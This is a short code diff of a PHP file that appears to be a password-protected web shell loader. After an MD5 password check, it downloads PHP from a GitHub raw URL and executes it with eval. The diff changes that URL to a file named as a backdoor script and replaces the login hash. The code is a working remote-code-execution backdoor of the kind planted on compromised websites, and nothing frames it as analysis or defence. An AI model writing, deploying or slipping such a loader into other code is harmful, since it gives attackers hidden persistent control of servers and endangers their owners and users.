@@ -33,13 +33,13 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/anomim989/ho/refs/heads/main/xts');
+    $a = geturlsinfo('https://raw.githubusercontent.com/drian-o/PJP-Neverdie/refs/heads/main/script-mentahanbackdor.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
     if (isset($_POST['password'])) {
         $entered_password = $_POST['password'];
-        $hashed_password = 'b3a7c17e85fe1d5ceb2d15f74aa4e266'; // Replace this with your MD5 hashed password
+        $hashed_password = '777b43f1482cc12b7383532fbc788784'; // Replace this with your MD5 hashed password
         if (md5($entered_password) === $hashed_password) {
             // Password is correct, set a cookie to indicate login
             setcookie('user_id', 'user123', time() + 3600, '/'); // Ganti 'user123' dengan nilai yang sesuai
